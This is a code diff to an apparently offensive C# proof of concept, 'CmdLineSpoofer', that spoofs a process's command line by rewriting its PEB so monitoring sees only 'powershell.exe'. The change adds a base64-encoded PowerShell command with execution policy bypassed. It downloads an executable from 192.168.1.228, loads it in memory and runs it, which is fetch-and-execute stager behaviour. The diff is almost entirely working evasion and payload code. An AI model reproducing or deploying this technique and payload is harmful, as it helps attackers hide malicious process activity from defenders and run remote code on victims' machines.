@@ -11,13 +11,13 @@ namespace CmdLineSpoofer
     {
         static void Main(string[] args)
         {
-            // the command to spoof
-            string spoofedCommand = "powershell.exe /c Defo not injecting meterpreter...";
-
             // the malicious command
-            string maliciousCommand = "powershell.exe\0";
+            string maliciousCommand = "powershell.exe -exec bypass -enc WwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgAyADgALwBwAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAKAAsACAAWwBzAHQAcgBpAG4AZwBbAF0AXQAgACgAJwAxADkAMgAuADEANgA4AC4AMQAuADIAMgA4ACcALAAgAFsAcwB0AHIAaQBuAGcAXQAgACQAUABJAEQALAAgACcAMQAwACcAKQApACkAOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADAAMAB9AA==\0";
 
-            Debug("[+] Spoofing command: " + spoofedCommand );
+            // the command to spoof
+            string spoofedCommand = "powershell.exe".PadRight(maliciousCommand.Length, ' ');
+
+            Debug("[+] Spoofing command: " + spoofedCommand.Trim(' '));
 
             // spawn a process to spoof the command line of
             STARTUPINFO si = new STARTUPINFO();
@@ -91,27 +91,23 @@ namespace CmdLineSpoofer
 
             Debug("[+] Original CommandLine: {0}", new string[] { cmdLine });
 
-            // todo: write the new spoofed PEB back to memory
             // we need to write byte array to procParams.CommandLine
             byte[] newCmdLine = Encoding.Unicode.GetBytes(maliciousCommand);
             WriteProcessMemory(pi.hProcess, procParams.CommandLine, newCmdLine, newCmdLine.Length, out IntPtr lpNumberOfBytesWritten);
 
-            // we also need to write new size as ushort to peb.ProcessParameters  + 112 bytes
-            byte[] sizeOfCmdLine = BitConverter.GetBytes((ushort)(newCmdLine.Length));
+            // we also need to write the spoofed command length as ushort to peb.ProcessParameters  + 112 bytes
+            byte[] sizeOfCmdLine = BitConverter.GetBytes((ushort)("powershell.exe".Length * 2));
             WriteProcessMemory(pi.hProcess, IntPtr.Add(peb.ProcessParameters, 112), sizeOfCmdLine, sizeOfCmdLine.Length, out lpNumberOfBytesWritten);
 
-            Debug("[+] New CommandLine: {0}, written to process", new string[] { cmdLine });
+            Debug("[+] New CommandLine: {0}, written to process", new string[] { maliciousCommand });
 
             // resume the process
             ResumeThread(pi.hThread);
 
             Debug("[+] Resuming process");
 
-            //Console.WriteLine("Press a key to end...");
-            //Console.ReadLine();
-
-            // kill the process - temp - can be removed later
-            //Process.GetProcessById(pi.dwProcessId).Kill();
+            Debug("Press a key to end PoC...");
+            Console.ReadLine();
         }
 
         public static void Debug(string text, string[] args)
